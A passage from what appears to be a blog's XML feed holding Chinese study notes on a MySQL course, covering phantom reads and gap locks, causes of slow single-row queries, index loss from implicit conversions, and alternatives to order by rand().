会给主键索引上满足条件的行加上行锁</li><li>next-key lock 实际上是由间隙锁加行锁实现的</li><li>可重复读隔离级别遵守两阶段锁协议，所有加锁的资源，都是在事务提交或者回滚的时候才释放的</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20 幻读是什么，幻读有什么问题</title>
      <link href="/what-is-phantom-reading-and-what-s-wrong-with-phantom-reading/"/>
      <url>/what-is-phantom-reading-and-what-s-wrong-with-phantom-reading/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解全表扫猫的加锁方式</li><li>认识幻读</li><li>了解幻读所带来的问题以及如何解决幻读</li></ul><a id="more"></a><p>下面的示例都是基于表 t 进行展开的，建表和初始化语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;t&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;c&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;d&#96; int(11) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;c&#96; (&#96;c&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br><span class="line"> </span><br><span class="line">insert into t values(0,0,0),(5,5,5),</span><br><span class="line">(10,10,10),(15,15,15),(20,20,20),(25,25,25);</span><br></pre></td></tr></table></figure><h2 id="幻读是什么"><a href="#幻读是什么" class="headerlink" title="幻读是什么"></a>幻读是什么</h2><p>下面的语句序列，是怎么加锁的，加的锁又是什么时候释放的呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin;</span><br><span class="line">select * from t where d&#x3D;5 for update;</span><br><span class="line">commit;</span><br></pre></td></tr></table></figure><p>这个语句会命中 d=5 的这一行，对应的主键 id=5，因此在 select 语句执行完成后，id=5 这一行会加一个写锁，而且由于两阶段锁协议，这个写锁会在执行 commit 语句的时候释放。</p><p>由于字段 d 上没有索引，因此这条查询语句会做全表扫描。那么，其他被扫描到的，但不满足条件 <code>d=5</code> 的记录，会不会被加锁呢。</p><p>答案是，也会被锁住。</p><p>幻读指的是<strong>一个事务在前后两次查询同一个范围的时候，后一次查询看到了前一次查询没有看到的行</strong>。</p><h2 id="幻读有什么问题"><a href="#幻读有什么问题" class="headerlink" title="幻读有什么问题"></a>幻读有什么问题</h2><p>假设只在 id=5 这一行加行锁，会产生数据一致性问题。</p><p>我们把扫描过程中碰到的行，也都加上写锁，再来看看执行效果。</p><p><img src="inkdrop://file:-xYywTMuh" alt="clipboard.png"></p><p>由于 session A 把所有的行都加了写锁，所以 session B 在执行第一个 update 语句的时候就被锁住了。需要等到 T6 时刻 session A 提交以后，session B 才能继续执行。</p><p>这样对于 id=0 这一行，在数据库里的最终结果还是 (0,5,5)。在 binlog 里面，执行序列是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">insert into t values(1,1,5); &#x2F;*(1,1,5)*&#x2F;</span><br><span class="line">update t set c&#x3D;5 where id&#x3D;1; &#x2F;*(1,5,5)*&#x2F;</span><br><span class="line"> </span><br><span class="line">update t set d&#x3D;100 where d&#x3D;5;&#x2F;* 所有 d&#x3D;5 的行，d 改成 100*&#x2F;</span><br><span class="line"> </span><br><span class="line">update t set d&#x3D;5 where id&#x3D;0; &#x2F;*(0,0,5)*&#x2F;</span><br><span class="line">update t set c&#x3D;5 where id&#x3D;0; &#x2F;*(0,5,5)*&#x2F;</span><br></pre></td></tr></table></figure><p>但同时你也可以看到，id=1 这一行，在数据库里面的结果是 (1,5,5)，而根据 binlog 的执行结果是 (1,5,100)，也就是说幻读的问题还是没有解决。为什么我们已经这么“凶残”地，把所有的记录都上了锁，还是阻止不了 id=1 这一行的插入和更新呢？</p><p>原因很简单。在 T3 时刻，我们给所有行加锁的时候，id=1 这一行还不存在，不存在也就加不上锁。</p><p><strong>也就是说，即使把所有的记录都加上锁，还是阻止不了新插入的记录</strong>，这也是为什么“幻读”会被单独拿出来解决的原因。</p><h2 id="幻读怎么解决"><a href="#幻读怎么解决" class="headerlink" title="幻读怎么解决"></a>幻读怎么解决</h2><p>产生幻读的原因是，行锁只能锁住行，但是新插入记录这个动作，要更新的是记录之间的“间隙”。因此，为了解决幻读问题，InnoDB 只好引入新的锁，也就是间隙锁 (Gap Lock)。</p><p>顾名思义，间隙锁，锁的就是两个值之间的空隙。比如文章开头的表 t，初始化插入了 6 个记录，这就产生了 7 个间隙。</p><p><img src="inkdrop://file:Iy6mJB3VR" alt="clipboard.png"><br>这样，当执行 select * from t where d=5 for update 的时候，就不止是给数据库中已有的 6 个记录加上了行锁，还同时加了 7 个间隙锁。这样就确保了无法再插入新的记录。</p><p><strong>间隙锁和行锁合称 next-key lock，每个 next-key lock 是前开后闭区间。</strong></p><p>也就是说这时候，在一行行扫描的过程中，不仅将给行加上了行锁，还给行两边的空隙，也加上了间隙锁。</p><p>现在你知道了，数据行是可以加上锁的实体，数据行之间的间隙，也是可以加上锁的实体。但是间隙锁跟我们之前碰到过的锁都不太一样。</p><p>比如行锁，分成读锁和写锁。下图就是这两种类型行锁的冲突关系。</p><p><img src="inkdrop://file:S3-3rPtu1" alt="clipboard.png"><br>也就是说，跟行锁有冲突关系的是“另外一个行锁”。</p><p>但是间隙锁不一样，跟间隙锁存在冲突关系的，是“往这个间隙中插入一个记录”这个操作。间隙锁之间都不存在冲突关系。</p><p>间隙锁的引入，可能会导致同样的语句锁住更大的范围，这其实是影响了并发度的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>select * from t where d=5 for update;</code>，由于字段 d 上没有索引，因此这条查询语句会做全表扫描。不满足条件 <code>d= 5</code> 的记录，也会被加锁，因为如果不加锁的话，会产生幻读。</li><li>幻读是指<strong>一个事务在前后两次查询同一个范围的时候，后一次查询看到了前一次查询没有看到的行</strong>。</li><li>幻读所带来的问题就是，数据一致性被破坏，数据和日志在逻辑上不一致。</li><li>解决幻读的方式是，引入间隙锁。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>19 为什么我只查一行的语句，也执行这么慢</title>
      <link href="/why-do-I-only-check-one-line-of-the-statement-but-also-execute-so-slowly/"/>
      <url>/why-do-I-only-check-one-line-of-the-statement-but-also-execute-so-slowly/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解只查一行记录，也会执行得特别慢的多种情况</li></ul><a id="more"></a><p>有时候，在 Mysql 中，只查一行记录，也会执行得特别慢。</p><p>当然上面说的这个问题，肯定不是在 MySQL 数据库本身就有很大的压力，导致数据库服务器 CPU 占用率很高或 ioutil（IO 利用率）很高，这种情况下所有语句的执行都有可能变慢。</p><p>为了便于描述，我还是构造一个表，基于这个表来说明今天的问题。这个表有两个字段 id 和 c，并且我在里面插入了 10 万行记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;t&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;c&#96; int(11) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br><span class="line"> </span><br><span class="line">delimiter ;;</span><br><span class="line">create procedure idata()</span><br><span class="line">begin</span><br><span class="line">  declare i int;</span><br><span class="line">  set i&#x3D;1;</span><br><span class="line">  while(i&lt;&#x3D;100000)do</span><br><span class="line">    insert into t values(i,i);</span><br><span class="line">    set i&#x3D;i+1;</span><br><span class="line">  end while;</span><br><span class="line">end;;</span><br><span class="line">delimiter ;</span><br><span class="line"> </span><br><span class="line">call idata();</span><br></pre></td></tr></table></figure><h2 id="第一类：查询长时间不返回"><a href="#第一类：查询长时间不返回" class="headerlink" title="第一类：查询长时间不返回"></a>第一类：查询长时间不返回</h2><p>如下图所示，在表 t 执行下面的 SQL 语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t where id&#x3D;1;</span><br></pre></td></tr></table></figure><p>查询结果长时间不返回。</p><p>一般碰到这种情况的话，大概率是表 t 被锁住了。接下来分析原因的时候，一般都是首先执行一下 show processlist 命令，看看当前语句处于什么状态。</p><p>然后我们再针对每种状态，去分析它们产生的原因、如何复现，以及如何处理。</p><h3 id="等-MDL-锁"><a href="#等-MDL-锁" class="headerlink" title="等 MDL 锁"></a>等 MDL 锁</h3><p>通常前面的学习得知，MDL 锁是可能会导致整个表锁住的（增删改查都做不了）。</p><p>复现过程：</p><ol><li>开启一个事务 A ，对表 t 加一个 MDL 读锁（对表 t 做增删改查）</li><li>开启一个事务 B，对表 t 加一个 MDL 写锁（对表 t 增加一个字段）</li></ol><p>此时 session A 开启了事务，并没有释放，而 session B 需要 MDL 写锁，因此只能被阻塞（阻塞原因：MDL 读写锁是互斥的）</p><p>此时的解决方案就是，使用 show processlist 命令查看 Waiting for table metadata lock。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220813130648.png" alt=""></p><p>找出造成阻塞的 process id，把这个连接用 kill 命令断开即可。</p><h3 id="等-flush"><a href="#等-flush" class="headerlink" title="等 flush"></a>等 flush</h3><p>MySQL 中对表做 flush 操作的用法，一般有以下两个：</p><ul><li>flush tables t with read lock;</li><li>flush tables with read lock;</li></ul><p>这两个 flush 语句，如果指定表 t 的话，代表的是只关闭表 t；如果没有指定具体的表名，则表示关闭 MySQL 里所有打开的表。</p><p>但是正常这两个语句执行起来都很快，除非它们也被别的线程堵住了。</p><p>所以，出现 Waiting for table flush 状态的可能情况是：有一个 flush tables 命令被别的语句堵住了，然后它又堵住了我们的 select 语句。</p><p>重现步骤：</p><ul><li>开启一个事务 A，执行 <code>select sleep(1) from t</code>，故意每行都调用一次 sleep(1)，这样这个语句默认要执行 10 万秒（依据表 t 的总行数）</li><li>开启一个事务 B，执行 <code>flush tables t</code>，关闭表 t，这时就需要等 session A 的查询结束</li><li>此时如果再开启一个事务 C，执行查询语句，就会被 flush 命令堵住了</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220813130706.png" alt=""><br>解决方案同时是，找出造成阻塞的 process id，把这个连接用 kill 命令断开即可。</p><h3 id="等行锁"><a href="#等行锁" class="headerlink" title="等行锁"></a>等行锁</h3><p>现在，经过了表级锁的考验，我们的 select 语句终于来到引擎里了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t where id&#x3D;1 lock in share mode;</span><br></pre></td></tr></table></figure><ul><li>lock in share mode 表示加读锁（S 锁，共享锁）</li><li>for update 表示加写锁（X 锁，排他锁）</li></ul><p>由于访问 id=1 这个记录时要加读锁，如果这时候已经有一个事务在这行记录上持有一个写锁，我们的 select 语句就会被堵住。</p><p>复现步骤：</p><ol><li>开启一个事务 A，更新 id = 1 这一行的记录</li><li>开启一个事务 B，执行上面的 SQL 语句</li></ol><p>显然，session A 启动了事务，占有写锁，还不提交，是导致 session B 被堵住的原因。</p><p>Mysql 5.7 可以通过 sys.innodb_lock_waits 表查到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sys.innodb_lock_waits where locked_table&#x3D; &#39;&#96;test_dump&#96;.&#96;t&#96;&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220813130806.png" alt=""><br>通过这个命令可以得到的信息还是挺多的，找到对应的线程 id，将其 kill 掉即可。</p><p>连接被断开的时候，会自动回滚这个连接里面正在执行的线程，也就释放了 id=1 上的行锁。</p><h2 id="第二类：查询慢"><a href="#第二类：查询慢" class="headerlink" title="第二类：查询慢"></a>第二类：查询慢</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t where c&#x3D;50000 limit 1;</span><br></pre></td></tr></table></figure><p>由于字段 c 上没有索引，这个语句只能走 id 主键顺序扫描，因此需要扫描 5 万行。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220813130823.png" alt=""></p><p>通过查询慢查询日志，可以确定，确实扫描了 5 万行，但是并不慢呀，2ms 就返回了。</p><p><strong>坏查询不一定是慢查询</strong>。我们这个例子里面只有 10 万行记录，数据量大起来的话，执行时间就线性涨上去了。</p><p>扫描行数多，所以执行慢，这个很好理解。</p><p>但是接下来，我们再看一个只扫描一行，但是执行很慢的语句。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220813130838.png" alt=""><br>复现步骤如上图所示。</p><p>session A 先用 start transaction with consistent snapshot 命令启动了一个事务，之后 session B 才开始执行 update 语句。</p><p>session B 执行完 100 万次 update 语句后，生成了 100 万个回滚日志 (undo log)。</p><p>带 lock in share mode 的 SQL 语句，是当前读，因此会直接读到 1000001 这个结果，所以速度很快；而 select * from t where id=1 这个语句，是一致性读，因此需要从 1000001 开始，依次执行 undo log，执行了 100 万次以后，才将 1 这个结果返回。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>坏查询不一定是慢查询，当数据量大一些时，执行时间就线性涨上去了</li><li>表锁、行锁都可能会导致阻塞查询语句</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18 为什么这些SQL语句逻辑相同，性能却差异巨大</title>
      <link href="/why-these-sql-statements-have-the-same-logic-but-the-performance-is-very-different/"/>
      <url>/why-these-sql-statements-have-the-same-logic-but-the-performance-is-very-different/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解常见的几种导致性能差异巨大的 SQL 语句</li></ul><p>在 MySQL 中，有很多看上去逻辑相同，但性能却差异巨大的 SQL 语句。对这些语句使用不当的话，就会不经意间导致整个数据库的压力变大。</p><a id="more"></a><h2 id="案例一：条件字段函数操作"><a href="#案例一：条件字段函数操作" class="headerlink" title="案例一：条件字段函数操作"></a>案例一：条件字段函数操作</h2><p>当需要统计某张表的某个月份的合计数量时，这个时候通常会使用 <code>month()</code> 函数，类似的 SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from t where month(created_at)&#x3D;7;</span><br></pre></td></tr></table></figure><p>对索引字段做函数操作，可能会破坏索引值的有序性，因此优化器就决定放弃走树搜索功能。</p><p>需要注意的是，优化器并不是要放弃使用这个索引。</p><p>在这个例子里，放弃了树搜索功能，优化器可以选择遍历主键索引，也可以选择遍历索引 created_at，优化器对比索引大小后发现，索引 created_at 更小，遍历这个索引比遍历主键索引来得更快。因此最终还是会选择索引 created_at。</p><p>所以，当使用 explain 命令查看这条 SQL 语句的执行计划时：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220812131115.png" alt=""></p><ul><li>key=”created_at” 表示的是，使用了 created_at 这个索引；在测试表数据中插入了 10 万行数据，rows=100335，说明这条语句扫描了整个索引的所有值</li><li>Extra 字段的 Using index，表示的是使用了覆盖索引</li></ul><p>也就是说，由于在 created_at 字段加了 month() 函数操作，导致了全索引扫描。为了能够用上索引的快速定位能力，我们就要把 SQL 语句改成基于字段本身的范围查询。按照下面这个写法，优化器就能按照我们预期的，用上 created_at 索引的快速定位能力了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from t where created_at &gt;&#x3D; &#39;2022-06-01&#39; and &#96;created_at&#96; &lt;&#x3D; &#39;2022-07-01&#39;;</span><br></pre></td></tr></table></figure><h2 id="案例二：隐式类型转换"><a href="#案例二：隐式类型转换" class="headerlink" title="案例二：隐式类型转换"></a>案例二：隐式类型转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t where order_no &#x3D; 110717;</span><br></pre></td></tr></table></figure><p>订单编号 order_no 这个字段上，本来就有索引，但是 explain 的结果却显示，这条语句需要走全表扫描。你可能也发现了，order_no 的字段类型是 varchar(32)，而输入的参数却是整型，所以需要做类型转换。</p><p>那么，现在这里就有两个问题：</p><ol><li>数据类型转换的规则是什么？</li><li>为什么有数据类型转换，就需要走全索引扫描？</li></ol><p>数据库里面类型这么多，这种数据类型转换规则更多，我记不住，应该怎么办呢？</p><p>这里有一个简单的方法，看 select “10” &gt; 9 的结果：</p><ul><li>如果规则是“将字符串转成数字”，那么就是做数字比较，结果应该是 1</li><li>如果规则是“将数字转成字符串”，那么就是做字符串比较，结果应该是 0</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220812131126.png" alt=""></p><p>从图中可知，select “10” &gt; 9 返回的是 1，所以你就能确认 MySQL 里的转换规则了：在 MySQL 中，字符串和数字做比较的话，是将字符串转换成数字。</p><p>因此上面的语句对于优化器来说，相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t where  CAST(order_no AS signed int) &#x3D; 110717;</span><br></pre></td></tr></table></figure><p>也就是说，这条语句触发了我们上面说到的规则：对索引字段做函数操作，优化器会放弃走树搜索功能。</p><h2 id="案例三：隐式字符编码转换"><a href="#案例三：隐式字符编码转换" class="headerlink" title="案例三：隐式字符编码转换"></a>案例三：隐式字符编码转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select d.* from tradelog l, trade_detail d where d.tradeid&#x3D;l.tradeid and l.id&#x3D;2;</span><br></pre></td></tr></table></figure><p>当联表查询时，这两个表的字符集不同，例如一个是 utf8，另一个是 utf8mb4，这时做表连接查询的时候用不上关联字段的索引。</p><p>字符集 utf8mb4 是 utf8 的超集，所以当这两个类型的字符串在做比较的时候，MySQL 内部的操作是，先把 utf8 字符串转成 utf8mb4 字符集，再做比较。</p><p>因此， 在执行上面这个语句的时候，需要将被驱动数据表里的字段一个个地转换成 utf8mb4，再跟 L2(id= 2) 做比较。</p><p>也就是说，实际上这个语句等同于下面这个写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from trade_detail  where CONVERT(traideid USING utf8mb4)&#x3D;$L2.tradeid.value;</span><br></pre></td></tr></table></figure><p>CONVERT() 函数，在这里的意思是把输入的字符串转成 utf8mb4 字符集。</p><p>这就再次触发了我们上面说到的原则：对索引字段做函数操作，优化器会放弃走树搜索功能。</p><p><strong>连接过程中要求在被驱动表的索引字段上加函数操作，是直接导致对被驱动表做全表扫描的原因</strong>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>条件字段函数操作、隐式类型转换、隐式字符编码转换，这三个例子都会导致对索引字段做函数操作</li><li>对索引字段做函数操作，可能会破坏索引值的有序性，因此优化器就决定放弃走树搜索功能</li><li>对索引字段做函数操作，会导致全表扫猫</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>17 如何正确地显示随机消息</title>
      <link href="/how-to-display-random-messages-correctly/"/>
      <url>/how-to-display-random-messages-correctly/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 <code>order by rand</code> 背后的执行流程</li><li>了解内存临时表和磁盘临时表</li></ul><a id="more"></a><h2 id="内存临时表"><a href="#内存临时表" class="headerlink" title="内存临时表"></a>内存临时表</h2><p>Mysql 中的 <code>rand()</code> 函数通常用来做随机排序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select word from words order by rand() limit 3;</span><br></pre></td></tr></table></figure><p>这个语句的意思很直白，随机排序取前 3 个。虽然这个 SQL 语句写法很简单，但执行流程却有点复杂的。</p><p>先用 explain 命令来看看这个语句的执行情况：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220810101905.png" alt=""><br>Extra 字段显示 Using temporary，表示的是需要使用临时表；Using filesort，表示的是需要执行排序操作。</p><p>因此这个 Extra 的意思就是，需要临时表，并且需要在临时表上排序。</p><p>这条语句的执行流程是这样的：</p><ol><li>创建一个临时表。这个临时表使用的是 memory 引擎，表里有两个字段，第一个字段是 double 类型，为了后面描述方便，记为字段 R，第二个字段是 varchar(64) 类型，记为字段 W。并且，这个表没有建索引。</li><li>从 words 表中，按主键顺序取出所有的 word 值。对于每一个 word 值，调用 rand() 函数生成一个大于 0 小于 1 的随机小数，并把这个随机小数和 word 分别存入临时表的 R 和 W 字段中，到此，扫描行数是 10000。</li><li>现在临时表有 10000 行数据了，接下来你要在这个没有索引的内存临时表上，按照字段 R 排序。</li><li>初始化 sort_buffer。sort_buffer 中有两个字段，一个是 double 类型，另一个是整型。</li><li>从内存临时表中一行一行地取出 R 值和位置信息（我后面会和你解释这里为什么是“位置信息”），分别存入 sort_buffer 中的两个字段里。这个过程要对内存临时表做全表扫描，此时扫描行数增加 10000，变成了 20000。</li><li>在 sort_buffer 中根据 R 的值进行排序。注意，这个过程没有涉及到表操作，所以不会增加扫描行数。</li><li>排序完成后，取出前三个结果的位置信息，依次到内存临时表中取出 word 值，返回给客户端。这个过程中，访问了表的三行数据，总扫描行数变成了 20003。</li></ol><p>查看慢查询日志（slow log，将 long_query_time 的时间设置为 0，这样所有的查询都会被记录到）来验证一下分析得到的扫描行数是否正确：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220810102023.png" alt=""></p><p>Rows_examined：20003 就表示这个语句执行过程中扫描了 20003 行，也就验证了我们分析得出的结论。</p><p>随机排序完整流程图：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220810101925.png" alt=""><br>图中的 pos 就是位置信息，你可能会觉得奇怪，这里的“位置信息”是个什么概念？在上一篇文章中，我们对 InnoDB 表排序的时候，明明用的还是 ID 字段。</p><p>这时候，我们就要回到一个基本概念：MySQL 的表是用什么方法来定位“一行数据”的。</p><p>如果创建的表没有主键，或者把一个表的主键删掉了，那么 InnoDB 会自己生成一个长度为 6 字节的 rowid 来作为主键。</p><p>这也就是排序模式里面，rowid 名字的来历。实际上它表示的是：每个引擎用来唯一标识数据行的信息。</p><ol><li>对于有主键的 InnoDB 表来说，这个 rowid 就是主键 ID；</li><li>对于没有主键的 InnoDB 表来说，这个 rowid 就是由系统生成的；</li><li>MEMORY 引擎不是索引组织表。在这个例子里面，你可以认为它就是一个数组。因此，这个 rowid 其实就是数组的下标</li></ol><p><strong>order by rand() 使用了内存临时表，内存临时表排序的时候使用了 rowid 排序方法</strong>。</p><h2 id="磁盘临时表"><a href="#磁盘临时表" class="headerlink" title="磁盘临时表"></a>磁盘临时表</h2><p>那么，是不是所有的临时表都是内存表呢？</p><p>其实不是的。tmp_table_size 这个配置限制了内存临时表的大小，默认值是 16M。如果临时表大小超过了 tmp_table_size，那么内存临时表就会转成磁盘临时表。</p><p>磁盘临时表使用的引擎默认是 InnoDB，是由参数 internal_tmp_disk_storage_engine 控制的。</p><h2 id="随机排序方法"><a href="#随机排序方法" class="headerlink" title="随机排序方法"></a>随机排序方法</h2><p>我们先把问题简化一下，如果只随机选择 1 个 word 值，可以怎么做呢？思路上是这样的：</p><ol><li>取得这个表的主键 id 的最大值 M 和最小值 N</li><li>用随机函数生成一个最大值到最小值之间的数 X = (M-N)*rand() + N</li><li>取不小于 X 的第一个 ID 的行</li></ol><p>这个算法暂时称作随机算法 1。下面是执行语句的序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select max(id),min(id) into @M,@N from words ;</span><br><span class="line">set @X&#x3D; floor((@M-@N+1)*rand() + @N);</span><br><span class="line">select * from words where id &gt;&#x3D; @X limit 1;</span><br></pre></td></tr></table></figure><p>这个方法效率很高，因为取 max(id) 和 min(id) 都是不需要扫描索引的，而第三步的 select 也可以用索引快速定位，可以认为就只扫描了 3 行。但实际上，这个算法本身并不严格满足题目的随机要求，因为 ID 中间可能有空洞，因此选择不同行的概率不一样，不是真正的随机。</p><p>比如你有 4 个 id，分别是 1、2、4、5，如果按照上面的方法，那么取到 id=4 的这一行的概率是取得其他行概率的两倍。</p><p>如果这四行的 id 分别是 1、2、40000、40001 呢？这个算法基本就能当 bug 来看待了。</p><p>所以，为了得到严格随机的结果，可以用下面这个流程:</p><ol><li>取得整个表的行数，并记为 C</li><li>取得 Y = floor(C * rand())。 floor 函数在这里的作用，就是取整数部分</li><li>再用 limit Y,1 取得一行</li></ol><p>这个算法暂时称作随机算法 2。下面是执行语句的序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select count(*) into @C from words;</span><br><span class="line">set @Y &#x3D; floor(@C * rand());</span><br><span class="line">set @sql &#x3D; concat(&quot;select * from words limit &quot;, @Y, &quot;,1&quot;);</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">execute stmt;</span><br><span class="line">DEALLOCATE prepare stmt;</span><br></pre></td></tr></table></figure><p>由于 limit 后面的参数不能直接跟变量，所以上述执行序列中，使用了 prepare+execute 的方法。你也可以把拼接 SQL 语句的方法写在应用程序中，会更简单些。</p><p>现在再看看，如果按照随机算法 2 的思路，要随机取 3 个 word 值呢？你可以这么做：</p><ol><li>取得整个表的行数，记为 C；</li><li>根据相同的随机方法得到 Y1、Y2、Y3；</li><li>再执行三个 limit Y, 1 语句得到三行数据。</li></ol><p>把这个算法，称作随机算法 3。下面是执行语句的序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select count(*) into @C from t;</span><br><span class="line">set @Y1 &#x3D; floor(@C * rand());</span><br><span class="line">set @Y2 &#x3D; floor(@C * rand());</span><br><span class="line">set @Y3 &#x3D; floor(@C * rand());</span><br><span class="line"></span><br><span class="line"># 在应用代码里面取 Y1、Y2、Y3 值，拼出 SQL 后执行</span><br><span class="line">select * from t limit @Y1，1；</span><br><span class="line">select * from t limit @Y2，1；</span><br><span class="line">select * from t limit @Y3，1;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>遇到随机排序需求时，应尽量避免使用 <code>order by rand()</code>，因为这个语句需要 Using temporary 和 Using filesort，查询的执行代价往往是比较大的。</li><li>正确的做法应该是，使用后面的几个算法方案，通过拼接 SQL 语句，获取预期的结果集。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>轻量级开发环境 Valet 快速上手</title>
      <link href="/get-started-quickly-with-the-lightweight-development-environment-valet/"/>
      <url>/get-started-quickly-with-the-lightweight-development-environment-valet/</url>
      
